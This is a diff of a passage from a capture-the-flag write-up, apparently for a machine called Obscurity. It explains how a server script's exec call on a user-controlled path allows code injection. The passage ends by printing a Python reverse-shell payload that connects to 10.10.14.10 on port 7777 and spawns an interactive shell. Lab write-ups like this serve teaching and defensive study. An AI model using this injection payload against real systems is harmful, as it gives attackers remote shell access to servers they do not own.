@@ -129,7 +129,7 @@ Looking through the script a line of code inside the ***ServeDoc*** function loo
 ![placeholder](/writeup/assets/img/obscurity/script.png "script")
 The path variable goes through the exec function,this can be used to perform remote code execution.
 
-The string in path variable goes through the *format* function first and then the exec function runs.So whatever is the path it goes to become a string as "output = path"; then exec function executes and creates a variable named **output** and assigns it the value *path*.That means a string is created using format fuction and since that string is in control of us, we can provide more command inside it that will be then executed through exec.
+The string in path variable goes through the *format* function first and then the exec function runs.So whatever is the path it goes to become a string as "output = Document: path"; then exec function executes and creates a variable named **output** and assigns it the value *path*.That means a string is created using format fuction and since that string is in control of us, we can provide more command inside it that will be then executed through exec.
 The following payload exploits this line of code
 ```bash
 Payload='; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.10',7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']); #
